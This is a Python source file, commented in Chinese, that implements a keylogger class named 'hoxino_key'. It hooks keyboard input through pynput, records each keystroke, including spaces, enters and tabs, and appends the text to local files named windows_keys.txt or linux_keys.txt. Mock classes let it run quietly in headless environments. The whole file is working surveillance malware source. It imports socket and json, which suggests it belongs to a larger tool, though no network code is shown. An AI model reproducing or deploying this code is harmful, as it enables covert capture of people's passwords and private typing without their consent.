import socket
import json
import os
import platform
import time

# 检测当前环境是否有图形界面
def has_display():
    if os.name == "nt":  # Windows系统
        return True
    
    # Linux/Unix系统
    return "DISPLAY" in os.environ and os.environ["DISPLAY"] != ""

# 根据环境决定是否导入pynput
HAS_GUI = has_display()
if HAS_GUI:
    from pynput.keyboard import Key, Listener, Controller
else:
    # 如果没有GUI，创建一个模拟的Listener和Key类
    class MockKey:
        space = "[Space]"
        backspace = "[Backspace]"
        enter = "[Enter]"
        tab = "[Tab]"
        
    class MockListener:
        def __init__(self, **kwargs):
            self.on_press = kwargs.get('on_press')
            self.on_release = kwargs.get('on_release')
            
        def __enter__(self):
            return self
            
        def __exit__(self, exc_type, exc_val, exc_tb):
            pass
            
        def start(self):
            pass
            
        def stop(self):
            pass
            
        def join(self):
            pass

    class MockController:
        def __init__(self):
            pass

    Key = MockKey
    Listener = MockListener
    Controller = MockController

class hoxino_key():
    def __init__(self):
        super(hoxino_key, self).__init__()
        self.has_gui = HAS_GUI
        self.log = ""
        if platform.system() == "Windows":
            self.keyfile = open("windows_keys.txt", "a", encoding="utf-8")
        else:
            self.keyfile = open("linux_keys.txt", "a", encoding="utf-8")

    def get_key_presses(self, key):
        self.out = ""
        # Handling keyboard input only if we have GUI
        if self.has_gui:
            try:
                if key == Key.space:
                    self.out = " "
                elif key == Key.backspace:
                    self.log = self.log[:-1]
                    self.out = "[backspace]"
                elif key == Key.enter:
                    self.out = "\n"
                elif key == Key.tab:
                    self.out = "\t"
                else:
                    self.out = key.char

                if self.out == None:
                    self.log += ""
                else:
                    self.log += self.out
                    self.keyfile.write(self.out)
                    self.keyfile.flush()
                
            except Exception as e:
                pass
        else:
            # 在无GUI环境下，记录一个占位符消息
            if not hasattr(self, 'no_gui_logged'):
                self.keyfile.write("[INFO] Running in headless environment - keyboard logging not available\n")
                self.keyfile.flush()
                self.no_gui_logged = True

    def start_keyboard(self):
        if self.has_gui:
            with Listener(on_press=self.get_key_presses) as self.listener:
                self.listener.join()
        else:
            # 在无GUI环境中，简单记录无法捕获键盘事件的信息
            print("[INFO] Running in headless environment - keyboard logging not available")
            # 保持线程运行，但不做实际的键盘捕获
            while not hasattr(self, 'stop_requested') or not self.stop_requested:
                time.sleep(1)

    def stop_keyboard(self):
        if self.has_gui:
            self.listener.stop()
        else:
            # 设置标志，通知键盘记录线程停止
            self.stop_requested = True